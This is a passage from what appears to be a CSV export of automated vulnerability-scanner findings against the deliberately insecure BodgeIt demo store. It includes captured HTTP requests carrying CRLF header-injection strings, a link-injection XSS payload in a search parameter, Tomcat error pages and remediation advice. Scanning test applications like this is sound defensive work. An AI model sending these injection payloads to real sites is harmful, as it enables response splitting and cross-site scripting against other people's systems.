Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","20","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity_20","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 121 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""736D3FDE6A89CE94BE7713EE1FB2C8BC""; PSID=""AEB77DB9767A0403D3B9B98F348DFFAA""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity_20""; AttackParamIndex=""3""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""33""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""39""; smi=""0""; sc=""1""; ID=""7501a06b-85c8-4a4c-9626-3f8ce630d575""; X-Request-Memo: ID=""24d145bc-01e6-456d-89cd-b16d8a8ab06e""; sc=""1""; ThreadId=""61""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=8AAC5A527778FC2B9C5FC94740B8E238 quantity_7=1&quantity_26=211&quantity_18=11&quantity_20=1%0d%0aSPIHeader:%20SPIValue&quantity_12=1&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2670 Date: Thu, 15 Oct 2015 19:14:37 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","30","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity_26","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 76 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""D238C1AF986BEC357531058447799642""; PSID=""2F08C26924C0F48A1DBFF17176C6A53E""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity_26""; AttackParamIndex=""1""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""32""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""39""; smi=""0""; sc=""1""; ID=""edc1d62c-5d39-4434-877f-3b115123a5e0""; X-Request-Memo: ID=""dd19a6dd-3270-4651-b0bf-c57c7bec94ef""; sc=""1""; ThreadId=""61""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=8AAC5A527778FC2B9C5FC94740B8E238 quantity_7=1&quantity_26=1%0d%0aSPIHeader:%20SPIValue&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2670 Date: Thu, 15 Oct 2015 19:14:09 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","28","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","quantity_7","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/basket.jsp Content-Type: application/x-www-form-urlencoded Content-Length: 62 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""A96FEC21146B25D643470D9A8677CE45""; PSID=""EEC55985FEBA55E64AEA57A3FEF1E558""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""90e84d4b-fe51-47a6-ace4-be01fbb9325c""; AttackSequence=""0""; AttackParamDesc=""quantity_7""; AttackParamIndex=""0""; AttackParamSubIndex=""0""; CheckId=""3582""; Engine=""Http+Response+Splitting""; SmartMode=""NonServerSpecificOnly""; AttackString=""1%250d%250aSPIHeader%3a%2520SPIValue""; AttackStringProps=""Attack""; ThreadId=""35""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""53""; smi=""0""; sc=""1""; ID=""de8190bf-36ed-4d22-a925-158970499271""; X-Request-Memo: ID=""ac726ccf-d048-42b8-9003-6a79c5b58f6f""; sc=""1""; ThreadId=""68""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=A92787F126D728E17AB078AA8A9CA54C;b_id=8 quantity_7=1%0d%0aSPIHeader:%20SPIValue&update=Update%20Basket","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2670 Date: Thu, 15 Oct 2015 19:14:04 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;1</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;1</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;1 SPIHeader: SPIValue&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:580) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","34","Poor Error Handling: Unhandled Exception","","Medium","Open","2015-10-15","WebInspect","388","Error Handling","","/bodgeit/basket.jsp","submit","","http://localhost:8080/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/product.jsp?prodid=26 Content-Type: application/x-www-form-urlencoded Content-Length: 48 Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Audit.Attack""; SID=""03144B9E78B2D47F8EE78E1E00A26D9F""; PSID=""7403EDB8C0E48040495CD4A06E6F0A06""; SessionType=""AuditAttack""; CrawlType=""None""; AttackType=""PostParamManipulation""; OriginatingEngineID=""18264a0f-d83e-4ef5-a73d-1f06044c9fde""; AttackSequence=""0""; AttackParamDesc=""submit""; AttackParamIndex=""3""; AttackParamSubIndex=""0""; CheckId=""2148""; Engine=""Post+Injection""; SmartMode=""NonServerSpecificOnly""; AttackString=""%250aA%3aB""; AttackStringProps=""Attack""; ThreadId=""37""; ThreadType=""AuditorStateRequestorPool""; X-RequestManager-Memo: sid=""41""; smi=""0""; sc=""1""; ID=""6aac93fe-a9de-4555-ba20-ba98e21c6477""; X-Request-Memo: ID=""c8d672c6-4f08-41e6-8b3e-7a6de3fcde06""; sc=""1""; ThreadId=""62""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=EACA26D061A6BEA0F2C2A347DC85CCA6;b_id="""" productid=26&price=3.99&quantity=1&submit=%0aA:B","HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 2680 Date: Thu, 15 Oct 2015 19:13:51 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - java.lang.NumberFormatException: For input string: &quot;11111111111&quot;</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>java.lang.NumberFormatException: For input string: &quot;11111111111&quot;</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: java.lang.NumberFormatException: For input string: &quot;11111111111&quot; org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:556) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;11111111111&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:277) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","","","",""
"DemoApps","","Bodgeit","519","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/init.jsp","","","http://localhost/bodgeit/root/init.jsp","","","","","","","",""
"DemoApps","","Bodgeit","513","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/login.jsp","password","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","452","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/password.jsp","password1","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","361","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/password.jsp","password2","","http://localhost/bodgeit/root/password.jsp","","","","","","","",""
"DemoApps","","Bodgeit","403","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/register.jsp","password1","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","498","Heap_Inspection","","Medium","Open","2015-10-15","Checkmarx","244","Improper Clearing of Heap Memory Before Release ('Heap Inspection')","","/bodgeit/root/register.jsp","password2","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","326","Client_Cross_Frame_Scripting_Attack","","Medium","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/advanced.jsp","","","http://localhost/bodgeit/root/advanced.jsp","","","","","","","",""
"DemoApps","","Bodgeit","78","Link Injection (facilitates Cross-Site Request Forgery)","","Medium","Open","2015-10-15","IBM Security AppScan Standard","74","Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')","","/bodgeit/search.jsp","q","","http://localhost/bodgeit/search.jsp","Parameter: q=1234 -> q=%22%27%3E%3CA+HREF%3D%22%2FWF_XSRF111.html%22%3EInjected+Link%3C%2FA%3E","GET /bodgeit/search.jsp?q=%22%27%3E%3CA+HREF%3D%22%2FWF_XSRF111.html%22%3EInjected+Link%3C%2FA%3E HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/search.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2061 Date: Thu, 15 Oct 2015 22:22:16 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <b>You searched for:</b> ""'><A HREF=""/WF_XSRF111.html"">Injected Link</A><br/><br/> <div><b>No Results Found</b></div> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The test result seems to indicate a vulnerability because the test response contained a link to the file ""WF_XSRF.html"".","<fixRecommendations> <fixRecommendation type=""General""> <text>There are several mitigation techniques:</text> <text>[1] Strategy: Libraries or Frameworks</text> <text>Use a vetted library or framework that does not allow this weakness to occur, or provides constructs that make it easier to avoid.</text> <text>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</text> <br></br> <text>[2] Understand the context in which your data will be used, and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</text> <text>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</text> <text>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</text> <text>[-] HTML body</text> <text>[-] Element attributes (such as src=""XYZ"")</text> <text>[-] URIs</text> <text>[-] JavaScript sections</text> <text>[-] Cascading Style Sheets and style property</text> <text>Note that HTML Entity Encoding is only appropriate for the HTML body.</text> <text>Consult the XSS Prevention Cheat Sheet </text> <link target=""http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</link> <text>for more details on the types of encoding and escaping that are needed.</text> <br></br> <text>[3] Strategy: Identify and Reduce Attack Surface</text> <text>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</text> <br></br> <text>[4] Strategy: Output Encoding</text> <text>For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing the web page encoding. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</text> <br></br> <text>[5] Strategy: Identify and Reduce Attack Surface</text> <text>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</text> <br></br> <text>[6] Strategy: Input Validation</text> <text>Assume all input is malicious. Use an ""accept known good"" input validation strategy: a whitelist of acceptable inputs that strictly conform to specifications. Reject input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on a blacklist of malicious or malformed inputs. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</text> <text>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as ""red"" or ""blue.""</text> <text>When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed: not only parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so on. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</text> <text>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (""<3"") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the ""<"" character, which would need to be escaped or otherwise handled. In this case, stripping the ""<"" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</text> <text>Even if you make a mistake in your validation (such as forgetting one out 